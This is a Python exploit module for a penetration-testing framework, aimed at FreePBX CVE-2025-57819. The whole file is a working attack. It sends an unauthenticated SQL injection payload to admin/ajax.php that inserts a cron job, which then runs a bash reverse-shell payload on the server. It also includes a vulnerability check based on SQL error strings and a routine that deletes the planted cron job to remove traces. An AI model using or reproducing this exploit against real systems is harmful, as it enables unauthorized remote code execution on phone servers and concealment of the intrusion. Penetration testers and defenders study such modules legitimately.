#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from urllib.parse import urlencode
import random
import string
import time

class Module(Exploit, Http_client):
    
    __info__ = {
        "name": "FreePBX CVE-2025-57819 - Unauthenticated SQL Injection to RCE",
        "description": "FreePBX ajax.php unauthenticated SQL injection to RCE via cronjob injection",
        "author": ["KittySploit Team"],
        "cve": "CVE-2025-57819",
        "platform": Platform.UNIX,
        "payload": {
            "default": "payloads/singles/cmd/unix/bash_reverse_tcp",
            "platform": Platform.UNIX,
            "category": PayloadCategory.CMD,
        },
        "references": [
            "CVE-2025-57819",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-57819"
        ]
    }
    
    rhost = OptString("", "Target FreePBX hostname or IP", required=True)
    rport = OptPort(80, "Target port", required=True)
    ssl = OptBool(False, "Use SSL/TLS", required=True)
    verify_ssl = OptBool(False, "Verify SSL certificate", required=True)
    base_path = OptString("/", "Base URI path", required=False)
    wait_time = OptInteger(70, "Wait time for cronjob execution (seconds)", required=False)
    auto_cleanup = OptBool(True, "Automatically cleanup cronjob after exploitation", required=False)
    
    def __init__(self, framework=None):
        super().__init__(framework)
        self.job_name = None
        self.module_name = None
    
    def random_text(self, length=6):
        """Generate random text string"""
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _send_ajax_request(self, brand_payload):
        """Send AJAX request with SQL injection payload"""
        try:
            # Helper to get option value
            def get_option_value(option):
                if hasattr(option, 'value'):
                    return option.value
                elif hasattr(option, '__get__'):
                    try:
                        return option.__get__(self, type(self))
                    except:
                        return option
                return option
            
            # Get base path
            base = get_option_value(self.base_path) if hasattr(self, 'base_path') else '/'
            base = base.rstrip('/')
            
            # Generate random parameters
            template = self.random_text(5)
            model = self.random_text(5)
            
            # Build query parameters
            params = {
                'module': 'FreePBX\\modules\\endpoint\\ajax',
                'command': 'model',
                'template': template,
                'model': model,
                'brand': brand_payload
            }
            
            # Send request using http_request (which handles rhost/rport/ssl automatically)
            response = self.http_request(
                method="GET",
                path=f"{base}/admin/ajax.php",
                params=params,
                timeout=30
            )
            
            if response:
                return {
                    'code': response.status_code if hasattr(response, 'status_code') else 0,
                    'body': response.text if hasattr(response, 'text') else str(response)
                }
            
            return None
            
        except Exception as e:
            print_error(f"Request failed: {e}")
            return None
    
    def check(self):
        """Check if target is vulnerable"""
        try:
            target = self.rhost
            port = self.rport
            
            print_info(f"Checking {target}:{port} for CVE-2025-57819...")
            
            # Generate random test string
            random_str = self.random_text(4)
            payload = f"{random_str}'"
            
            response = self._send_ajax_request(payload)
            
            if response and response['code'] == 500:
                body = response['body']
                
                # Check for SQL syntax error
                if 'You have an error in your SQL syntax' in body:
                    print_success("✓ Target is vulnerable - SQL injection detected")
                    return {
                        'vulnerable': True,
                        'reason': 'SQL injection error detected',
                        'confidence': 'high'
                    }
                # Check for PHP error indicating SQL injection
                elif 'Trying to access array offset on value of type bool' in body:
                    print_success("✓ Target is vulnerable - Error-based SQLi confirmed")
                    return {
                        'vulnerable': True,
                        'reason': 'Error-based SQL injection confirmed',
                        'confidence': 'high'
                    }
            
            print_error("✗ Target is not vulnerable or patched")
            return {
                'vulnerable': False,
                'reason': 'No SQL injection indicators found',
                'confidence': 'medium'
            }
            
        except Exception as e:
            return {
                'vulnerable': False,
                'reason': f'Check failed: {e}',
                'confidence': 'low'
            }
    
    def _cleanup_cronjob(self):
        """Clean up created cronjob"""
        if not self.job_name:
            print_warning("No cronjob to clean up")
            return False
        
        print_info(f"Attempting to clean up cronjob: '{self.job_name}'")
        
        cleanup_payload = f"'; DELETE FROM cron_jobs WHERE jobname='{self.job_name}' -- "
        
        response = self._send_ajax_request(cleanup_payload)
        
        if response and response['code'] == 500:
            body = response['body']
            if 'Trying to access array offset on value of type bool' in body:
                print_success("✓ Cronjob removed successfully")
                self.job_name = None
                return True
        
        print_warning("Failed to remove cronjob - manual cleanup may be required")
        return False
    
    def run(self):
        """Execute the exploit"""
        try:
            target = self.rhost
            port = self.rport
            
            print_info(f"Target: {target}:{port}")
            print_warning("FreePBX CVE-2025-57819 - Unauthenticated SQL Injection to RCE")
            
            # Generate random names for module and job
            self.module_name = self.random_text(6)
            self.job_name = self.random_text(6)
            
            # Get payload command
            if not hasattr(self, 'payload') or not self.payload:
                print_error("Payload not set")
                fail.Message("Exploit failed: Payload not set")
                return False
            
            # Get generated payload (self.payload already handles generation)
            try:
                generated_payload = self.payload
                if not generated_payload:
                    print_error("Failed to generate payload")
                    fail.Message("Exploit failed: Failed to generate payload")
                    return False
                
                # Convert bytes to string if needed
                if isinstance(generated_payload, bytes):
                    payload_cmd = generated_payload.decode('utf-8', errors='ignore')
                else:
                    payload_cmd = str(generated_payload)
                
                print_info(f"Generated command: {payload_cmd}")
                
            except Exception as e:
                print_error(f"Failed to generate payload: {e}")
                fail.Message(f"Exploit failed: {e}")
                return False
            
            # Build SQL injection payload to create cronjob
            sql_payload = f"';INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) "
            sql_payload += f"VALUES ('{self.module_name}','{self.job_name}','{payload_cmd}',NULL,'* * * * *',30,1,1) -- "
            
            print_info("Sending SQL injection payload...")
            
            response = self._send_ajax_request(sql_payload)
            
            if not response:
                print_error("No response from server")
                fail.Message("Exploit failed: No response from server")
                return False
            
            if response['code'] == 500:
                body = response['body']
                if 'Trying to access array offset on value of type bool' in body:
                    print_success(f"✓ Successfully created cronjob: '{self.job_name}'")
                    print_info(f"Waiting for cronjob to trigger (up to {self.wait_time} seconds)...")
                    
                    # Wait for cronjob execution
                    # Cronjobs typically run every minute, so we wait a bit longer
                    time.sleep(self.wait_time)
                    
                    print_success("Payload execution completed!")
                    print_info("Check your listener for connection...")
                    
                    # Cleanup if enabled
                    if self.auto_cleanup:
                        print_info("Cleaning up cronjob...")
                        self._cleanup_cronjob()
                    
                    return True
                else:
                    print_error("Failed to create cronjob - unexpected response")
                    print_info(f"Response body: {body[:500]}")
                    fail.Message("Exploit failed: Failed to create cronjob")
                    return False
            else:
                print_error(f"Unexpected HTTP status code: {response['code']}")
                fail.Message(f"Exploit failed: HTTP {response['code']}")
                return False
                
        except Exception as e:
            print_error(f"Exploitation failed: {e}")
            fail.Message(f"Exploitation failed: {e}")
            return False

